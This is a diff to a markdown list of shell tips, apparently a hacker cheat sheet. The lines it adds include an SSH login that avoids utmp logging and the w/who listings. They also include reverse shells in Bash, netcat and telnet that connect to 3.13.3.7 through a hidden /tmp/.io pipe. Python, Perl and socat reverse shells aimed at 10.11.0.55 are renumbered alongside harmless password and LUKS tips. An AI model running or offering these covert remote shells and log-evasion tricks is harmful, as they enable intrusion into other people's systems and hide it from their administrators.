@@ -26,7 +26,7 @@ $ kill -9 $$
 ```
 $ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
 ```
-This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
+This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
 
 **3. SSH tunnel OUT**
 
@@ -253,13 +253,90 @@ Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from our system (cou
 # tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
 ```
 
-**20. Spawn a reverse shell with Python**
+**20. Generate quick random Password**
 
+Good for quick passwords without human element.
+
+```
+$ openssl rand -base64 24
+```
+
+**21. Get a root shell in Docker container.**
+
+If the container is already running:
+
+```
+$ docker exec -it --user root <container-name> /bin/bash
+```
+
+If the container is not running:
+
+```
+$ docker run -it --user root --entrypoint /bin/bash <container>
+```
+
+**22. Linux transportable encrypted filesystems.**
+
+Like truecrypt but better.  You may need to `losetup -f` to get a loop device.
+
+Make a junk file, here 256MB is used, encrypt, and partition. You will be prompted for a password.
+
+```
+$ dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
+$ cryptsetup luksFormat /tmp/crypted
+$ mkfs.ext3 /tmp/crypted
+```
+
+Mount:
+
+```
+# losetup /dev/loop0 /tmp/crypted
+# cryptsetup open /dev/loop0 crypted
+# mount -t ext3 /dev/mapper/crypted /mnt/crypted
+```
+
+Store data in `/mnt/crypted`, then unmount:
+
+```
+# umount /mnt/crypted
+# cryptsetup close crypted
+# losetup -d /dev/loop0
+```
+
+**23. Reverse Shell with Bash**
+
+Start netcat to listen on port 1524 on your system:
+```
+$ nc -nvlp 1524
+```
+
+On the remote system. This Bash will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
+```
+$ bash -i 2>&1 >& /dev/tcp/3.13.3.7/1524 0>&1
+```
+
+**24. Reverse Shell without Bash**
+
+Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
+
+On the remote system:
+```
+$ mkfifo /tmp/.io
+$ sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
+```
+
+Telnet variant:
+```
+$ mkfifo /tmp/.io
+$ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
+```
+
+**24. Reverse shell with Python**
 ```
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.55",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-**21. Spawn a reverse shell with Perl**
+**25. Reverse shell with Perl**
 
 ```
 # method 1
@@ -268,7 +345,7 @@ $ perl -e 'use Socket;$i="10.11.0.55";$p=4445;socket(S,PF_INET,SOCK_STREAM,getpr
 $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.11.0.55:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 
-**22. Upgrade a dumb shell to a pty shell**
+**26. Upgrade a dumb shell to a pty shell**
 
 ```
 # python
@@ -279,7 +356,7 @@ perl -e 'exec "/bin/bash";'
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
-**23. Upgrade a dumb shell to a fully interactive shell with Python and stty**
+**27. Upgrade a dumb shell to a fully interactive shell with Python and stty**
 
 ```
 # on target host
@@ -295,7 +372,7 @@ $ export TERM=xterm-256color
 $ stty rows 43 columns 132
 ```
 
-**24. Spawn a fully interactive reverse shell with socat**
+**28. Spawn a fully interactive reverse shell with socat**
 
 ```
 # on attacker's host (listener)
